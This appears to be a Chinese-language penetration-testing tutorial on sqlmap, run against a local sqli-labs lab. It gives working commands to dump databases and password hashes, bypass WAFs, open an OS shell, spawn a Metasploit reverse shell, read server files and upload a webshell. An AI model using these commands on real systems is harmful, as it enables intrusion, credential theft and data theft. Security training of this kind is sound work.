---
{"dg-publish":true,"title":"sqlmap","dg-path":"安全/工具/sqlmap.md","permalink":"/安全/工具/sqlmap/","dgPassFrontmatter":true}
---

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.anquanke.com](https://www.anquanke.com/post/id/235846)

> 安全客 - 安全资讯平台

![](https://p0.ssl.qhimg.com/t01e1cadd763d794f6d.jpg)

作者：谢公子

# Sqlmap


**sqlmap** 是一个自动化的 SQL 注入工具，其主要功能是扫描，发现并利用给定的 URL 进行 SQL 注入。目前支持的数据库有 MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase 和 SAP MaxDB 等

Sqlmap 采用了以下 5 种独特的 SQL 注入技术

*   基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入
*   基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已经执行 (即页面返回时间是否增加) 来判断
*   基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中
*   联合查询注入，在可以使用 Union 的情况下注入
*   堆查询注入，可以同时执行多条语句时的注入

Sqlmap 的强大的功能包括 数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时执行任意命令。

sqlmap 是一个跨平台的工具，很好用，是 SQL 注入方面一个强大的工具！

我们可以使用 -h 参数查看 sqlmap 的参数以及用法，**sqlmap -h**

![](https://p1.ssl.qhimg.com/t01bdaeb5865a613177.png)

sqlmap 默认的 User-Agent：sqlmap/1.1.9.22#dev ([http://sqlmap.org](http://sqlmap.org/))

![](https://p0.ssl.qhimg.com/t0125c050b4a36f54c6.png)

# Sqlmap 的简单用法


```
sqlmap -r http.txt  
sqlmap -r http.txt -p username  
sqlmap -u "http://www.xx.com/username/admin*"       
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"   
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --data="u  
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  
有时候使用 --passwords 不能获取到密码，则可以试下
-D mysql -T user -C host,user,password --dump  当MySQL< 5.7时
-D mysql -T user -C host,user,authentication_string --dump  当MySQL>= 5.7时
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --dbs        
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --tables     
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --columns    
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --current-db 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump --start 1 --stop 100  

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  

sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tamper=space2comment.py  
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-pwn   

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" 
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  

sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     
其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="http://127.0.0.1:8080"    
当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    
支持的探测方式如下：
　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）

sqlmap -d "mysql://root:root@192.168.10.130:3306/mysql" --os-shell   

-v3                   
--threads 5           
--fresh-queries       
--flush-session       
--batch               
--random-agent        
--tamper base64encode            
--referer http://www.baidu.com   

--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数

```

### 探测指定 URL 是否存在 SQL 注入漏洞

**对于不用登录的网站**，直接指定其 URL

```
sqlmap -u  "http://192.168.10.1/sqli/Less-1/?id=1"  

```

在探测目标 URL 是否存在漏洞的过程中，Sqlmap 会和我们进行交互。

比如第一处交互的地方是说这个目标系统的数据库好像是 Mysql 数据库，是否还探测其他类型的数据库。我们选择 n，就不探测其他类型的数据库了，因为我们已经知道目标系统是 Mysql 数据库了。

第二处交互的地方是说 对于剩下的测试，问我们是否想要使用扩展提供的级别 (1) 和风险 (1) 值的 “MySQL” 的所有测试吗？ 我们选择 y。

![](https://p2.ssl.qhimg.com/t01402f9ea9562a8e25.png)

第三处交互是说已经探测到参数 id 存在漏洞了，是否还探测其他地方，我们选择 n 不探测其他参数了 。

最后 sqlmap 就列出了参数 id 存在的注入类型是 boolean 盲注，还有 payload 其他信息也显示出来了，最后还列出了目标系统的版本，php，apache 等信息。

![](https://p1.ssl.qhimg.com/t018ffeaea388a20f96.png)

这次探测的所有数据都被保存在了 **/root/.sqlmap/output/192.168.10.1/** 目录下

![](https://p4.ssl.qhimg.com/t0109afcd10954974f6.png)

**对于需要登录的网站**，我们需要指定其 cookie 。我们可以用账号密码登录，然后用抓包工具抓取其 cookie 填入

```
sqlmap -u  "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"  

```

**对于是 post 提交数据的 URL**，我们需要指定其 data 参数

```
sqlmap -u "http://192.168.10.1/sqli/Less-11/?id=1" --data="u  

```

![](https://p2.ssl.qhimg.com/t01cd3dcbfe0685247b.png)

**我们也可以通过抓取 http 数据包保存为文件**，然后指定该文件即可。这样，我们就可以不用指定其他参数，这对于需要登录的网站或者 post 提交数据的网站很方便。

我们抓取了一个 post 提交数据的数据包保存为 post.txt，如下，uname 参数和 passwd 参数存在 SQL 注入漏洞

```
POST /sqli/Less-11/ HTTP/1.1
Host: 192.168.10.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Referer: http://192.168.10.1/sqli/Less-11/
Connection: close
Upgrade-Insecure-Requests: 1

uname=admin&passwd=admin&submit=Submit

```

然后我们可以指定这个数据包进行探测

```
sqlmap -r post.txt        
```

他也会和我们进行交互，询问我们，这里就不一一解释了

![](https://p4.ssl.qhimg.com/t0184de93de8fd4b128.png)

可以看到，已经探测到 uname 参数存在漏洞了，问我们是否还想探测其他参数，我们选择的 y ，它检测到 passwd 也存在漏洞了，问我们是否还想探测其他参数，我们选择 n

![](https://p4.ssl.qhimg.com/t010d67187cada10591.png)

然后会让我们选择，在后续的测试中，是选择 uname 这个参数还是 passwd 这个参数作为漏洞，随便选择一个就好了。

![](https://p0.ssl.qhimg.com/t01562d119ea7abc2a0.png)

### 查看数据库的所有用户 (—users)

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users 


```

### ![](https://p1.ssl.qhimg.com/t01094c128ee722bb40.png)

### 查看数据库所有用户名的密码 (—passwords)

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords 
```

第一处询问我们是否保存密码的 hash 值为文件，我们不保存。第二处问我们是否使用 sqlmap 自带的字典进行爆破，我们选择 y，可以看出把密码爆破出来了，root 用户的密码也为 root。如果这里爆破不出来，我们可以拿 hash 值去字典更强大的地方爆破

### ![](https://p1.ssl.qhimg.com/t0163773c28f2937ed5.png)

### 查看数据库当前用户 (—current-user)

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  
```

### 判断当前用户是否有管理权限 (—is-dba)

查看当前账户是否为数据库管理员账户

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba  
```

### ![](https://p1.ssl.qhimg.com/t0121e516c7c614fc1b.png)

### 列出数据库管理员角色 (—roles)

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles   
```

### ![](https://p1.ssl.qhimg.com/t01a095aa631969a7fc.png)

### 查看所有的数据库 (—dbs)

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dbs
```

### ![](https://p5.ssl.qhimg.com/t0189a6637411cb3482.png)

### 查看当前的数据库 (—current-db)

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-db 
```

![](https://p4.ssl.qhimg.com/t0184d52d7edf6a0218.png)

### 爆出指定数据库中的所有的表

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables 
```

![](https://p1.ssl.qhimg.com/t0154e7dcf64c049fce.png)

### 爆出指定数据库指定表中的所有的列

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns
```

![](https://p4.ssl.qhimg.com/t01557f4395d91accdc.png)

### 爆出指定数据库指定表指定列下的数据

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  
```

![](https://p2.ssl.qhimg.com/t016b9a96c7c30a57d7.png)

### 爆出该网站数据库中的所有数据

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  

```

# Sqlmap 的高级用法


Sqlmap 在默认情况下除了适用 CHAR() 函数防止出现单引号，没有对注入的数据进行修改。我们可以使用—tamper 参数对数据进行修改来绕过 WAF 等设备，其中的大部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过 WAF 的检测规则。Sqlmap 目前官方提供 53 个绕过脚本。

### 探测指定 URL 是否存在 WAF，并且绕过

```
--identify-waf   检测是否有WAF

#使用参数进行绕过
--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候
--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时
--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上
--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过
--ignore-proxy    禁止使用系统的代理，直接连接进行注入
--flush-session   清空会话，重构注入
--hex 或者 --no-cast     进行字符码转换
--mobile          对移动端的服务器进行注入
--tor             匿名注入

```

### 指定脚本进行绕过 (—tamper)

有些时候网站会过滤掉各种字符，可以用 tamper 来解决（对付某些 waf 时也有成效）

```
sqlmap  --tamper=space2comment.py  
sqlmap  --tamper="space2comment.py,space2plus.py"  指定多个脚本进行过滤

```

过滤脚本在目录：**/usr/share/sqlmap/tamper**

![](https://p1.ssl.qhimg.com/t01565062aff86a2767.png)

### 探测等级和危险等级 (—level —risk)

Sqlmap 一共有 5 个探测等级，默认是 1。等级越高，说明探测时使用的 payload 也越多。其中 5 级的 payload 最多，会自动破解出 cookie、XFF 等头部注入。当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET 和 POST 的数据都会进行测试，HTTP cookie 在 level 为 2 时就会测试，HTTP User-Agent/Referer 头在 level 为 3 时就会测试。在不确定哪个参数为注入点时，为了保证准确性，建议设置 level 为 5

sqlmap 一共有 3 个危险等级，也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思，在不确定的情况下，建议设置为 3 级，—risk=3

sqlmap 使用的 payload 在目录：**/usr/share/sqlmap/xml/payloads**

![](https://p3.ssl.qhimg.com/t01086cd70c1873d39a.png)

```
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 


```

![](https://p2.ssl.qhimg.com/t01d5a8232de4f2f4a6.png)

### 伪造 Http Referer 头部

Sqlmap 可以在请求中伪造 HTTP 中的 referer，当探测等级为 3 或者 3 以上时，会尝试对 referer 注入，可以使用 referer 命令来欺骗，比如，我们伪造 referer 头为百度。可以这样

```
referer  http://www.baidu.com
```

### 执行指定的 SQL 语句 (—sql-shell)

```
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  
```

然后会提示我们输入要查询的 SQL 语句，注意这里的 SQL 语句最后不要有分号

![](https://p1.ssl.qhimg.com/t017e2aa4b411649faa.png)

### ![](https://p5.ssl.qhimg.com/t016d7b506524e76a16.png)

### 执行操作系统命令 (—os-shell)

在数据库为 MySQL、PostgreSql 或者 SQL Server 时，可以执行该选项。

当为 MySQL 数据库时，需满足下面三个条件：

*   当前用户为 root
*   知道网站根目录的绝对路径
*   该数据库的 secure_file_priv 参数值为空 (很多数据库的该值为 NULL，这也就导致了即使当前用户是 root，即使知道了网站根目录的绝对路径，也不能执行成功 —os-shell)

```
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell  
```

**选择网站的脚本语言**

*   【1】ASP(默认)
*   【2】ASPX
*   【3】JSP
*   【4】PHP

您是否希望 sqlmap 进一步尝试引发完整路径的披露？【Y/n】

**选择判断网站可写目录的方法**

如果我们不知道网站的根目录的绝对路径的话，我们那里选择 4 暴力破解，尝试破解出根目录的绝对路径。这里因为是我们本地的环境，已经知道网站根目录的绝对地址了，所以选择 2

*   【1】使用公共的默认目录 (C:/xampp/htdocs/，C:/wamp/www，C:/Inetpub/wwwroot/)
*   【2】自定义网络根目录绝对路径
*   【3】指定自定义的路径文件
*   【4】暴力破解

![](https://p3.ssl.qhimg.com/t01871e1fc335db81df.png)

可以看到，其实执行 os-shell 的过程中，sqlmap 向网站根目录写入两个文件 tmpblwkd.php 和 tmpueqch.php。真正的木马文件是 tmpblwkd.php 。如果是非正常退出 sqlmap 的话，这两个文件不会被删除。只有当我们输入 x 或 q 退出 sqlmap 时，该文件才会被自动删除。

![](https://p5.ssl.qhimg.com/t015a0aa18a923881ee.png)

![](https://p4.ssl.qhimg.com/t01356b89b90db96323.png)

![](https://p5.ssl.qhimg.com/t01c5976157489fa7a4.png)

![](https://p5.ssl.qhimg.com/t01de1bbab11027a0db.png)

### 反弹一个 MSF 的 shell(—os-pwn)

在数据库为 MySQL、PostgreSql 或者 SQL Server 时，可以执行该选项。并且需要当前获取的权限足够高才可以。

```
sqlmap -u "http://192.168.10.20:88/index.php?id=1"  

```

![](https://p5.ssl.qhimg.com/t01b527df2522fbd96c.png)

**选择连接的 tunnel，这里选择默认的 1 就可以了**  
[1] TCP: Metasploit Framework (default)  
[2] ICMP: icmpsh – ICMP tunneling  
> 1

**选择网站的脚本语言，这里根据情况选择**  
[1] ASP  
[2] ASPX  
[3] JSP  
[4] PHP (default)  
> 4

**选择网站的路径，这里也是根据情况而定，如果知道网站路径的话，可以选择 2 然后手动输入**  
[1] common location(s) (‘C:/xampp/htdocs/, C:/wamp/www/, C:/Inetpub/wwwroot/‘) (default)  
[2] custom location(s)  
[3] custom directory list file  
[4] brute force search  
> 2  
please provide a comma separate list of absolute directory paths: C:\phpstudy\WWW

![](https://p1.ssl.qhimg.com/t01ed3941c4c73cca18.png)

**然后选择连接的类型，这里选择默认的 1 即可**

which connection type do you want to use?  
[1] Reverse TCP: Connect back from the database host to this machine (default)  
[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535  
[3] Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP  
[4] Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS  
[5] Bind TCP: Listen on the database host for a connection  
> 1

**然后还会提示监听的地址和端口，这里直接回车即可**

![](https://p3.ssl.qhimg.com/t01d5600ba16319fb20.png)

![](https://p2.ssl.qhimg.com/t01715275b9acc1930c.png)

**然后这里选择 payload 的类型，我们这里选择默认的 1**

which payload do you want to use?nt to use? [11563] ‘ (detected)]  
[1] Meterpreter (default)  
[2] Shell  
[3] VNC  
> 1

![](https://p3.ssl.qhimg.com/t01dc5a821ad98334e4.png)

执行完成后，如果不出问题，我们就可以获得一个 MSF 类型的 shell 了。

![](https://p1.ssl.qhimg.com/t011858b704025dfe6a.png)

### 读取服务器文件 (—file-read)

当数据库为 MySQL、PostgreSQL 或 SQL Server，并且当前用户有权限时，可以读取指定文件，可以是文本文件或者二进制文件。

```
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" 

```

![](https://p5.ssl.qhimg.com/t01b427170c4f0ab056.png)

可以看到，文件读取成功了，并且保存成了 /root/.sqlmap/output/192.168.10.1/files/c__test.txt 文件

### ![](https://p5.ssl.qhimg.com/t013ae8d3a38bbf4e30.png)

### 上传文件到数据库服务器中 (—file-write —file-dest)

当数据库为 MySQL、Postgre SQL 或者 Sql Server(通过 powershell 写入)，并且当前用户有权限向任意目录写文件的时候，可以上传文件到数据库服务器。文件可以是文本，也可以是二进制文件。

所以利用上传文件，我们可以上传一句话木马或者上传 shell 上去。

前提是我们知道网络的绝对路径

```
python2 sqlmap.py -u http://192.168.10.130/sqli-labs/Less-2/?id=1 --file-write C:\Users\mi\Desktop\1.php --file-dest "C:\phpStudy\PHPTutorial\WWW\2.php"  
```

![](https://p2.ssl.qhimg.com/t01d920ad318047b01b.png)

这里会问我们是否想验证上传成功，我们选择 y 的话，他就会读取该文件的大小，并且和本地的文件大小做比较，只要大于等于本地文件大小即说明上传功能了

![](https://p4.ssl.qhimg.com/t01b2207ac0c22f171d.png)

![](https://p1.ssl.qhimg.com/t01ec317729423cc757.png)



